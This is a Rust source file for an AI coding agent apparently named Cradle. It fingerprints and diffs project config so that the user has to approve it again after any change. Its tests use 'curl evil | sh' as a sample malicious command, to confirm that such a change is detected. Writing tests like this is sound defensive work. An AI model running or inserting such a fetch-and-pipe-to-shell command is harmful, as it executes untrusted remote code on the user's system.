//! Project config must be approved by the user before it applies, and again whenever it
//! changes. See `.agents/roadmap/FEATURE_TRUST.md`.

use std::collections::BTreeMap;
use std::fmt::Write;
use std::fs;
use std::io;
use std::path::{Path, PathBuf};

use cradle_config::{ModeAccess, ProjectConfig, SourceKind};
use serde::{Deserialize, Serialize};
use sha2::{Digest, Sha256};

use crate::modes::ClashChoice;

/// Everything in the project config that changes Cradle's behaviour, as readable text:
/// the config form, `[commands]`, each mode's access, commands and file content, the
/// rules, and each skill. Stored when the user trusts the config, so a later change can be
/// shown as a diff.
pub fn snapshot(config: &ProjectConfig) -> io::Result<String> {
    let root = config
        .root
        .canonicalize()
        .unwrap_or_else(|_| config.root.clone());
    let rel = |path: &Path| {
        path.strip_prefix(&root)
            .unwrap_or(path)
            .display()
            .to_string()
    };
    let mut out = String::new();
    let source = match config.source {
        SourceKind::Directory => ".agents/",
        SourceKind::File => "agents.toml",
    };
    let m = &config.modes;
    writeln!(out, "# Project config ({source})").unwrap();
    writeln!(
        out,
        "clash_handler = {}",
        format!("{:?}", m.clash_handler).to_lowercase()
    )
    .unwrap();

    writeln!(out, "\n[commands]  (each run asks for approval)").unwrap();
    for (name, line) in &config.commands {
        writeln!(out, "{name} = {line}").unwrap();
    }

    let mut modes: Vec<(&str, ModeAccess, Option<&Path>)> = vec![
        (
            "plan",
            ModeAccess::Read,
            m.plan.as_ref().map(|p| p.path.as_path()),
        ),
        (
            "build",
            ModeAccess::Full,
            m.build.as_ref().map(|p| p.path.as_path()),
        ),
    ];
    modes.extend(
        m.extra
            .iter()
            .map(|e| (e.name.as_str(), e.access, Some(e.path.as_path()))),
    );
    for (name, access, path) in modes {
        let commands = m.commands.get(name);
        if path.is_none() && commands.is_none() {
            continue;
        }
        let access = match access {
            ModeAccess::Read => "read-only",
            ModeAccess::Full => "full access",
        };
        let file = path.map_or("built-in prompt".to_owned(), rel);
        writeln!(out, "\n[mode {name}]  ({access}, {file})").unwrap();
        if let Some(commands) = commands {
            writeln!(out, "commands that skip approval once reviewed:").unwrap();
            for (command, line) in commands {
                writeln!(out, "  {command} = {line}").unwrap();
            }
        }
        if let Some(path) = path {
            push_body(&mut out, &fs::read_to_string(path)?);
        }
    }

    if let Some(rules) = &config.docs.rules {
        writeln!(out, "\n[rules]").unwrap();
        push_body(&mut out, rules);
    }
    for skill in &config.skills {
        writeln!(out, "\n[skill {}]  ({})", skill.name, rel(&skill.path)).unwrap();
        push_body(&mut out, &fs::read_to_string(&skill.path)?);
    }
    Ok(out)
}

fn push_body(out: &mut String, text: &str) {
    out.push_str(text);
    if !text.ends_with('\n') {
        out.push('\n');
    }
}

/// The sha256 of [`snapshot`]: what `trust.toml` records as approved.
pub fn fingerprint(config: &ProjectConfig) -> io::Result<String> {
    Ok(snapshot_hash(&snapshot(config)?))
}

/// The hash of a [`snapshot`], as stored in `trust.toml`.
pub fn snapshot_hash(snapshot: &str) -> String {
    hex::encode(Sha256::digest(snapshot.as_bytes()))
}

/// A unified diff from the last approved snapshot (`None`: never approved) to `new`.
pub fn config_diff(old: Option<&str>, new: &str) -> String {
    cradle_tools::fs::unified_diff("project config", old, new)
}

#[derive(Debug, Default, Serialize, Deserialize)]
struct TrustFile {
    #[serde(default)]
    projects: BTreeMap<String, ProjectRecord>,
}

#[derive(Debug, Default, Clone, Serialize, Deserialize)]
struct ProjectRecord {
    #[serde(default, skip_serializing_if = "Option::is_none")]
    hash: Option<String>,
    /// "override" or "combine", for `clash_handler = "ask"`.
    #[serde(default, skip_serializing_if = "Option::is_none")]
    clash: Option<String>,
    /// "dir" or "file", when both `.agents/` and `agents.toml` exist.
    #[serde(default, skip_serializing_if = "Option::is_none")]
    source: Option<String>,
}

/// `~/.config/cradle/trust.toml`, keyed by canonical project path.
#[derive(Debug)]
pub struct TrustStore {
    path: PathBuf,
    data: TrustFile,
}

impl TrustStore {
    pub fn load(path: PathBuf) -> io::Result<Self> {
        let data = match fs::read_to_string(&path) {
            Ok(src) => toml::from_str(&src).map_err(|e| {
                io::Error::new(
                    io::ErrorKind::InvalidData,
                    format!("{}: {e}", path.display()),
                )
            })?,
            Err(e) if e.kind() == io::ErrorKind::NotFound => TrustFile::default(),
            Err(e) => return Err(e),
        };
        Ok(TrustStore { path, data })
    }

    pub fn is_trusted(&self, root: &Path, hash: &str) -> bool {
        self.record(root)
            .and_then(|r| r.hash.as_deref())
            .is_some_and(|h| h == hash)
    }

    /// Record `snapshot` as approved. Its hash is what [`TrustStore::is_trusted`] checks.
    pub fn trust(&mut self, root: &Path, snapshot: &str) -> io::Result<()> {
        if let Some(path) = self.snapshot_path(root) {
            if let Some(parent) = path.parent() {
                fs::create_dir_all(parent)?;
            }
            fs::write(path, snapshot)?;
        }
        self.record_mut(root).hash = Some(snapshot_hash(snapshot));
        self.save()
    }

    /// The snapshot the user last approved, if it is stored and still matches the
    /// recorded hash.
    pub fn approved_snapshot(&self, root: &Path) -> Option<String> {
        let hash = self.record(root)?.hash.as_deref()?;
        let text = fs::read_to_string(self.snapshot_path(root)?).ok()?;
        (snapshot_hash(&text) == hash).then_some(text)
    }

    /// `trust/<sha256 of the project key>.txt` next to `trust.toml`.
    fn snapshot_path(&self, root: &Path) -> Option<PathBuf> {
        let name = format!("{}.txt", snapshot_hash(&Self::key(root)));
        Some(self.path.parent()?.join("trust").join(name))
    }

    pub fn clash_choice(&self, root: &Path) -> Option<ClashChoice> {
        match self.record(root)?.clash.as_deref()? {
            "override" => Some(ClashChoice::Override),
            "combine" => Some(ClashChoice::Combine),
            _ => None,
        }
    }

    pub fn set_clash_choice(&mut self, root: &Path, choice: ClashChoice) -> io::Result<()> {
        self.record_mut(root).clash = Some(
            match choice {
                ClashChoice::Override => "override",
                ClashChoice::Combine => "combine",
            }
            .to_owned(),
        );
        self.save()
    }

    pub fn source_choice(&self, root: &Path) -> Option<SourceKind> {
        match self.record(root)?.source.as_deref()? {
            "dir" => Some(SourceKind::Directory),
            "file" => Some(SourceKind::File),
            _ => None,
        }
    }

    pub fn set_source_choice(&mut self, root: &Path, source: SourceKind) -> io::Result<()> {
        self.record_mut(root).source = Some(
            match source {
                SourceKind::Directory => "dir",
                SourceKind::File => "file",
            }
            .to_owned(),
        );
        self.save()
    }

    fn key(root: &Path) -> String {
        root.canonicalize()
            .unwrap_or_else(|_| root.to_path_buf())
            .to_string_lossy()
            .into_owned()
    }

    fn record(&self, root: &Path) -> Option<&ProjectRecord> {
        self.data.projects.get(&Self::key(root))
    }

    fn record_mut(&mut self, root: &Path) -> &mut ProjectRecord {
        self.data.projects.entry(Self::key(root)).or_default()
    }

    fn save(&self) -> io::Result<()> {
        if let Some(parent) = self.path.parent() {
            fs::create_dir_all(parent)?;
        }
        let text = toml::to_string(&self.data).map_err(io::Error::other)?;
        fs::write(&self.path, text)
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    fn config(root: &Path, command: &str, plan: &str) -> ProjectConfig {
        config_with(root, command, plan, "")
    }

    fn config_with(root: &Path, command: &str, plan: &str, extra: &str) -> ProjectConfig {
        let dir = root.join(".agents");
        fs::create_dir_all(dir.join("modes")).unwrap();
        fs::write(dir.join("modes/plan.md"), plan).unwrap();
        fs::write(
            dir.join("modes.toml"),
            format!(
                "[default]\nplan_mode = \"modes/plan.md\"\n[commands]\ntest = \"{command}\"\n{extra}"
            ),
        )
        .unwrap();
        cradle_config::load(root, SourceKind::Directory).unwrap()
    }

    #[test]
    fn fingerprint_tracks_commands_and_mode_files() {
        let tmp = tempfile::tempdir().unwrap();
        let a = fingerprint(&config(tmp.path(), "cargo test", "plan")).unwrap();
        assert_eq!(
            a,
            fingerprint(&config(tmp.path(), "cargo test", "plan")).unwrap()
        );
        assert_ne!(
            a,
            fingerprint(&config(tmp.path(), "curl evil | sh", "plan")).unwrap()
        );
        assert_ne!(
            a,
            fingerprint(&config(tmp.path(), "cargo test", "plan!")).unwrap()
        );
        assert_ne!(
            a,
            fingerprint(&config_with(
                tmp.path(),
                "cargo test",
                "plan",
                "[plan_mode.commands]\ncheck = \"cargo check\""
            ))
            .unwrap(),
            "mode commands are trusted config"
        );
    }

    #[test]
    fn diff_shows_exactly_what_changed() {
        let tmp = tempfile::tempdir().unwrap();
        let old = snapshot(&config(tmp.path(), "cargo test", "Plan carefully.")).unwrap();
        let new = snapshot(&config_with(
            tmp.path(),
            "curl evil | sh",
            "Plan carefully.",
            "[build_mode.commands]\nfmt = \"cargo fmt\"",
        ))
        .unwrap();
        let diff = config_diff(Some(&old), &new);
        assert!(diff.contains("-test = cargo test"), "{diff}");
        assert!(diff.contains("+test = curl evil | sh"), "{diff}");
        assert!(diff.contains("+  fmt = cargo fmt"), "{diff}");
        assert!(!diff.contains("-Plan carefully."), "unchanged text: {diff}");

        let first = config_diff(None, &new);
        assert!(first.contains("+test = curl evil | sh"), "{first}");
    }

    #[test]
    fn store_round_trips() {
        let tmp = tempfile::tempdir().unwrap();
        let path = tmp.path().join("cfg/trust.toml");
        let mut store = TrustStore::load(path.clone()).unwrap();
        let (h1, h2) = (snapshot_hash("one"), snapshot_hash("two"));
        assert!(!store.is_trusted(tmp.path(), &h1));
        assert_eq!(store.approved_snapshot(tmp.path()), None);
        store.trust(tmp.path(), "one").unwrap();
        store
            .set_clash_choice(tmp.path(), ClashChoice::Combine)
            .unwrap();

        let mut store = TrustStore::load(path).unwrap();
        assert!(store.is_trusted(tmp.path(), &h1));
        assert!(
            !store.is_trusted(tmp.path(), &h2),
            "a changed config needs approval again"
        );
        assert_eq!(store.approved_snapshot(tmp.path()).as_deref(), Some("one"));
        assert_eq!(store.clash_choice(tmp.path()), Some(ClashChoice::Combine));

        store.trust(tmp.path(), "two").unwrap();
        assert!(store.is_trusted(tmp.path(), &h2));
        assert_eq!(store.approved_snapshot(tmp.path()).as_deref(), Some("two"));
    }
}
